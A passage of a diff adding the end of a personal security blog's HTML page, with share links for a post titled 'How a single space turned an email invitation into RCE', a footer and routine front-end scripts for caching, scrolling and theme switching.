30.231,-21.295c3.732,-10.464 3.732,-19.431 2.612,-21.298c-1.119,-1.869 -4.105,-2.99 -8.583,-5.232Z" />
+                </svg>
+              </a>
+            </li>
+            <li>
+              <a target="_blank" rel="noopener noreferrer" aria-label="share How a single space turned an email invitation into RCE on telegram" href="https://telegram.me/share/url?text=How%20a%20single%20space%20turned%20an%20email%20invitation%20into%20RCE&amp;url=https%3a%2f%2fdhtzs.dev%2fwrite-ups%2f1%2f">
+                <svg version="1.1" xml:space="preserve" viewBox="2 2 28 28" height="30px" width="30px" fill="currentColor">
+                  <path d="M26.49,29.86H5.5a3.37,3.37,0,0,1-2.47-1,3.35,3.35,0,0,1-1-2.47V5.48A3.36,3.36,0,0,1,3,3,3.37,3.37,0,0,1,5.5,2h21A3.38,3.38,0,0,1,29,3a3.36,3.36,0,0,1,1,2.46V26.37a3.35,3.35,0,0,1-1,2.47A3.38,3.38,0,0,1,26.49,29.86Zm-5.38-6.71a.79.79,0,0,0,.85-.66L24.73,9.24a.55.55,0,0,0-.18-.46.62.62,0,0,0-.41-.17q-.08,0-16.53,6.11a.59.59,0,0,0-.41.59.57.57,0,0,0,.43.52l4,1.24,1.61,4.83a.62.62,0,0,0,.63.43.56.56,0,0,0,.4-.17L16.54,20l4.09,3A.9.9,0,0,0,21.11,23.15ZM13.8,20.71l-1.21-4q8.72-5.55,8.78-5.55c.15,0,.23,0,.23.16a.18.18,0,0,1,0,.06s-2.51,2.3-7.52,6.8Z" />
+                </svg>
+              </a>
+            </li>
+            <li>
+              <a target="_blank" rel="noopener noreferrer" aria-label="share How a single space turned an email invitation into RCE on ycombinator" href="https://news.ycombinator.com/submitlink?t=How%20a%20single%20space%20turned%20an%20email%20invitation%20into%20RCE&u=https%3a%2f%2fdhtzs.dev%2fwrite-ups%2f1%2f">
+                <svg version="1.1" xml:space="preserve" width="30px" height="30px" viewBox="0 0 512 512" fill="currentColor" xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape">
+                  <path d="M449.446 0C483.971 0 512 28.03 512 62.554L512 449.446C512 483.97 483.97 512 449.446 512L62.554 512C28.03 512 0 483.97 0 449.446L0 62.554C0 28.03 28.029 0 62.554 0L449.446 0ZM183.8767 87.9921H121.8427L230.6673 292.4508V424.0079H281.3328V292.4508L390.1575 87.9921H328.1233L256 238.2489z" />
+                </svg>
+              </a>
+            </li>
+          </ul>
+        </footer>
+      </article>
+    </main>
+
+    <footer class="footer">
+      <p>&copy; 2026 | CC BY-SA 4.0</p>
+      <a href="https://github.com/dhtzs/dhtzs.dev" target="_blank" rel="noopener noreferrer me" title="View source">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <polyline points="16 18 22 12 16 6" />
+          <polyline points="8 6 2 12 8 18" />
+        </svg>
+        with
+        <svg stroke-linejoin="round" stroke-linecap="round" stroke-width="2" stroke="currentColor" fill="none" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"></path></svg>
+        and
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" fill="none">
+          <path d="M18 8h1a4 4 0 0 1 0 8h-1"></path>
+          <path d="M2 8h16v9a4 4 0 0 1-4 4H6a4 4 0 0 1-4-4V8z"></path>
+          <line x1="6" y1="1" x2="6" y2="4"></line>
+          <line x1="10" y1="1" x2="10" y2="4"></line>
+          <line x1="14" y1="1" x2="14" y2="4"></line>
+        </svg>
+        by Dimitris Chatzis
+      </a>
+    </footer>
+    <a href="#top" id="top-link" class="top-link hidden" aria-label="go to top" title="Go to top (Alt + G)" accesskey="g">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevrons-up">
+        <polyline points="17 11 12 6 7 11"></polyline>
+        <polyline points="17 18 12 13 7 18"></polyline>
+      </svg>
+    </a>
+
+    <script>
+      if ("serviceWorker" in navigator) {
+          navigator.serviceWorker.register("\/sw.min.js", {
+              updateViaCache: "none"
+          }).catch(function(e) {
+              return console.error(e.message);
+          });
+      }
+    </script>
+    <script>
+      var offlineReading = document.getElementById("offlineReading");
+      if ("serviceWorker" in navigator && "caches" in window) {
+          function checkIfCached() {
+              return caches.open("offline-access").then(function(cache) {
+                  return cache.match(location.pathname).then(function(match) {
+                      return !!match;
+                  });
+              });
+          }
+
+          function addToCache() {
+              return Promise.all([
+                  caches.open("offline-access"),
+                  fetch("/index.json").then(function(res) {
+                      return res.json();
+                  })
+              ]).then(function(results) {
+                  let cache = results[0];
+                  let data = results[1].find(function(entry) {
+                      return entry.permalink.indexOf(location.pathname) !== -1;
+                  });
+                  return cache.addAll(data.resources.concat(data.permalink));
+              });
+          }
+
+          function removeFromCache() {
+              return Promise.all([
+                  caches.open("offline-access"),
+                  fetch("/index.json").then(function(res) {
+                      return res.json();
+                  })
+              ]).then(function(results) {
+                  let cache = results[0];
+                  let data = results[1].find(function(entry) {
+                      return entry.permalink.indexOf(location.pathname) !== -1;
+                  });
+                  return Promise.all(data.resources.concat(data.permalink).map(function(url) {
+                      return cache.delete(url);
+                  }));
+              });
+          }
+
+          function updateOfflineReading(isCached) {
+              if (!isCached) {
+                  offlineReading.textContent = "Save to cache";
+                  offlineReading.style.color = "#16a34a";
+              } else {
+                  offlineReading.textContent = "Remove from cache";
+                  offlineReading.style.color = "#dc2626";
+              }
+          }
+
+          checkIfCached().then(function(isCached) {
+              updateOfflineReading(isCached);
+          });
+          offlineReading.addEventListener("click", function() {
+              checkIfCached().then(function(isCached) {
+                  if (!isCached) {
+                      return addToCache().then(function() {
+                          updateOfflineReading(true);
+                      });
+                  } else {
+                      return removeFromCache().then(function() {
+                          updateOfflineReading(false);
+                      });
+                  }
+              }).catch(function(e) {
+                  console.error(e.message);
+              });
+          });
+      } else {
+          offlineReading.previousSibling.remove();
+          offlineReading.remove();
+      }
+    </script>
+
+    <script>
+      var menu = document.getElementById("menu");
+      if (menu) {
+          const scrollPosition = localStorage.getItem("menu-scroll-position");
+          if (scrollPosition) {
+              menu.scrollLeft = parseInt(scrollPosition, 10);
+          }
+
+          let menuScrollTimeout;
+          menu.addEventListener("scroll", function() {
+              clearTimeout(menuScrollTimeout);
+              menuScrollTimeout = setTimeout(function () {
+                  localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+              }, 150);
+          }, { passive: true });
+      }
+
+      document.querySelectorAll('a[href^="#"]').forEach(function(anchor) {
+          anchor.addEventListener("click", function(e) {
+              e.preventDefault();
+              var id = this.getAttribute("href").substr(1);
+              const target = document.querySelector(`[id='${decodeURIComponent(id)}']`);
+              if (!window.matchMedia("(prefers-reduced-motion: reduce)").matches) {
+                  target.scrollIntoView({
+                      behavior: "smooth"
+                  });
+              } else {
+                  target.scrollIntoView();
+              }
+              if (target.tabIndex < 0 && !target.hasAttribute("tabindex")) {
+                  target.setAttribute("tabindex", "-1");
+              }
+              target.focus({ preventScroll: true });
+              if (id === "top") {
+                  history.replaceState(null, null, " ");
+              } else {
+                  history.pushState(null, null, `#${id}`);
+              }
+          });
+      });
+    </script>
+    <script>
+      var toplink = document.getElementById("top-link");
+      var scrollTicking = false;
+      window.addEventListener("scroll", function() {
+          if (scrollTicking) {
+              return;
+          }
+          scrollTicking = true;
+          requestAnimationFrame(function() {
+              const scrollThreshold = window.innerHeight;
+              const shown = document.body.scrollTop > scrollThreshold || document.documentElement.scrollTop > scrollThreshold;
+              toplink.classList.toggle("hidden", !shown);
+              scrollTicking = false;
+          });
+      }, { passive: true });
+    </script>
+    <script>
+      document.getElementById("theme-toggle").addEventListener("click", function() {
+          var html = document.querySelector("html");
+          if (html.dataset.theme === "dark") {
+              html.dataset.theme = "light";
+              localStorage.setItem("pref-theme", "light");
+          } else {
+              html.dataset.theme = "dark";
+              localStorage.setItem("pref-theme", "dark");
+          }
+          if (window.interactionsChart !== undefined) {
+              window.interactionsChart.update();
+          }
+      });
+    </script>
+  </body>
+</html>
